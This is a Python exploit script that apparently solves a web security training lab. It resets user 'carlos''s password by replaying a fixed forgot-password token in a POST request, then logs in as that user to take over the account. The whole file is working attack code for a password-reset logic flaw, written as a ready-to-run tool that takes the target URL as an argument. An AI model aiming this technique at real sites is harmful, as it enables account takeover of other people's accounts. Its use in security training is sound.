import requests
import sys



def reset_password(url, session):
    data = {"temp-forgot-password-token": "er2tmr8drtwiqfxvmo626sh9cu46v27r", "username": "carlos", "new-password-1": "pass", "new-password-2": "pass"}
    response = session.post(f"{url}/forgot-password?temp-forgot-password-token=er2tmr8drtwiqfxvmo626sh9cu46v27r", data=data, allow_redirects=False, timeout=10)
    return response.status_code == 302


def login(url, session):
    response = session.post(f"{url}/login", data={"username": "carlos", "password": "pass"}, timeout=10)
    return "Your username is: carlos" in response.text


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    try:
        url = sys.argv[1].rstrip("/")
        session = requests.Session()
        session.mount("https://", requests.adapters.HTTPAdapter(max_retries=requests.adapters.Retry(total=3, backoff_factor=0.1)))

        print("(+) Resetting the user carlos's password...")
        if reset_password(url, session):
            print("(+) Password successfully reset!")
        else:
            print("(-) Something went wrong. Please check your URL and try again.")
            sys.exit(1)

        print("(+) Logging in as carlos...")
        if login(url, session):
            print("(+) Successfully solved the lab!")
        else:
            print("(-) Something went wrong.")


    except requests.exceptions.Timeout:
        print("(-) Request timed out.")

    except requests.exceptions.MissingSchema:
        print("(-) Please enter a valid URL.")

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to host. Please check your URL and try again.")

    except KeyboardInterrupt:
        sys.exit(1)


if __name__ == "__main__":
    main()
